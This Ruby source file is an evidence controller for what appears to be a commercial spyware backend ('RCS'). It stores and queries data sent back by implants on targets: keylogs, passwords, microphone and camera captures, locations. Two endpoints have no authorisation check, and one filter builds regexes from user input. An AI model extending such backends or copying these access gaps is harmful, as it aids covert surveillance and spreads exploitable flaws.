#
# Controller for the Evidence objects
#

require_relative '../db_layer'
require_relative '../evidence_manager'
require_relative '../evidence_dispatcher'

# rcs-common
require 'rcs-common/symbolize'
require 'eventmachine'
require 'em-http-request'

# system
require 'time'
require 'json'

require 'rocketamf'

class BSON::ObjectId
  def encode_amf ser
    ser.serialize 3, self.to_s
  end
end

module RCS
module DB

class EvidenceController < RESTController

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server, :tech

    return conflict if @request[:content]['content'].nil?

    ident = @params['_id'].slice(0..13)
    instance = @params['_id'].slice(15..-1).downcase
    
    # save the evidence in the db
    begin
      id, shard_id = RCS::DB::EvidenceManager.instance.store_evidence ident, instance, @request[:content]['content']
      # notify the worker
      RCS::DB::EvidenceDispatcher.instance.notify id, shard_id, ident, instance
    rescue Exception => e
      trace :warn, "Cannot save evidence: #{e.message}"
      return not_found
    end
    
    trace :info, "Evidence [#{ident}::#{instance}][#{id}] saved and dispatched to shard #{shard_id}"
    return ok({:bytes => @request[:content]['content'].size})
  end

  def update
    require_auth_level :view

    mongoid_query do
      target = Item.where({_id: @params['target']}).first
      return not_found("Target not found: #{@params['target']}") if target.nil?

      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
      @params.delete('_id')
      @params.delete('target')

      @params.each_pair do |key, value|
        if evidence[key.to_s] != value
          Audit.log :actor => @session[:user][:name], :action => 'evidence.update', :desc => "Updated '#{key}' to '#{value}' for evidence #{evidence[:_id]}"
        end
      end

      evidence.update_attributes(@params)

      return ok(evidence)
    end
  end

  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server, :tech
    
    # create a phony session
    session = @params.symbolize
    
    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?
    
    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc

    # update the agent version
    agent.version = @params['version']

    # reset the counter for the dashboard
    agent.reset_dashboard
    
    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IN_PROGRESS
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save

    # update the stat of the target
    target = agent.get_parent
    target.stat[:last_sync] = time
    target.stat[:last_child] = [agent[:_id]]
    target.reset_dashboard
    target.save

    # update the stat of the target
    operation = target.get_parent
    operation.stat[:last_sync] = time
    operation.stat[:last_child] = [target[:_id]]
    operation.save

    # check for alerts on this agent
    Alerting.new_sync agent

    return ok
  end
  
  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server, :tech

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
    agent.save

    return ok
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found("Agent not found: #{session[:bid]}") if agent.nil?

    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
    agent.save

    return ok
  end

  def index
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = create_common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # paging
      if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
        start_index = @params['startIndex'].to_i
        num_items = @params['numItems'].to_i
        query = filtering.where(filter_hash).order_by([[:acquired, :asc]]).skip(start_index).limit(num_items)
      else
        # without paging, return everything
        query = filtering.where(filter_hash).order_by([[:acquired, :asc]])
      end

      return ok(query)
    end
  end

  def index_amf
    mongoid_query do

      filter, filter_hash, target_id = create_mongo_filter @params

      db = Mongoid.database
      coll = db.collection("evidence.#{target_id}")

      opts = {sort: ["acquired", :ascending]}

      start_time = Time.now

      #paging
      if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
        opts[:skip] = @params['startIndex'].to_i
        opts[:limit] = @params['numItems'].to_i
        array = coll.find(filter_hash, opts)
          .to_a
      else
        array = coll.find(filter_hash, opts)
          .to_a
      end

      trace :debug, "[index_amf] queried mongodb for #{array.size} evidences in #{Time.now - start_time}"
      start_time = Time.now

      array.is_array_collection = true
      amf = RocketAMF.serialize(array, 3)

      trace :debug, "[index_amf] AMF serialized #{array.size} evidences in #{Time.now - start_time}"

      return ok(amf, {content_type: 'binary/octet-stream'})
    end
  end

  def count
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = create_common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      num_evidence = filtering.where(filter_hash).count

      # Flex RPC does not accept 0 (zero) as return value for a pagination (-1 is a safe alternative)
      num_evidence = -1 if num_evidence == 0
      return ok(num_evidence)
    end
  end

  def info
    require_auth_level :view

    mongoid_query do

      filter, filter_hash, target = create_common_filter @params
      return not_found("Target or Agent not found") if filter.nil?

      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id]).where({:type => 'info'})
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # without paging, return everything
      query = filtering.where(filter_hash).order_by([[:acquired, :asc]])

      return ok(query)
    end
  end

  def create_common_filter(params)

    # filtering
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter'

    # if not specified the filter on the date is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil?
    filter['to'] = Time.now.to_i if filter['to'].nil?

    filter_hash = {}

    # filter by target
    target = Item.where({_id: filter.delete('target')}).first
    return nil if target.nil?

    # filter by agent
    filter_hash[:agent_id] = filter.delete('agent') if filter['agent']

    # default filter is on acquired
    date = filter.delete('date')
    date ||= 'acquired'
    date = date.to_sym

    # date filters must be treated separately
    filter_hash[date.gte] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date.lte] = filter.delete('to') if filter.has_key? 'to'

    return filter, filter_hash, target
  end

  def create_mongo_filter(params)
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter'

    # target id
    target_id = filter.delete('target')

    # default date filtering is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil?
    filter['to'] = Time.now.to_i if filter['to'].nil?

    filter_hash = {}

    # agent filter
    filter_hash["agent_id"] = filter.delete('agent') if filter['agent']

    # date filter
    date = filter.delete('date')
    date ||= 'acquired'

    filter_hash[date] = Hash.new
    filter_hash[date]["$gte"] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date]["$lte"] = filter.delete('to') if filter.has_key? 'to'

    if filter.has_key? 'info'
      begin
        key_values = filter.delete('info').split(',')
        key_values.each do |kv|
          k, v = kv.split(':')
          filter_hash["data.#{k}"] = Regexp.new("#{v}", true)
          trace :debug, "Filtering data[#{k}] by keyword '#{v}'"
        end
      rescue Exception => e
        trace :error, "Invalid filter for data [#{e.message}], ignoring..."
      end
    end

    # remaining filters
    filter.each_key do |k|
      filter_hash[k] = {"$in" => filter[k]}
    end

    return filter, filter_hash, target_id
  end

  def total
    # filtering
    filter = {}
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'

    # filter by target
    target = Item.where({_id: filter['target']}).first
    return not_found("Target not found") if target.nil?

    condition = {}

    # filter by agent
    if filter['agent']
      agent = Item.where({_id: filter['agent']}).first
      return not_found("Agent not found") if agent.nil?
      condition[:aid] = filter['agent']
    end
    
    types = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device", "download", "file", "filesystem", "info", "keylog", "location", "message", "mic", "mouse", "password", "print", "screeshot", "url"]

    stats = {}
    types.each do |type|
      query = {type: type}.merge(condition)
      stats[type] = Evidence.collection_class(target[:_id]).where(query).count
    end

    stats[:total] = stats.values.inject(:+)

    return ok(stats)
  end

end

end #DB::
end #RCS::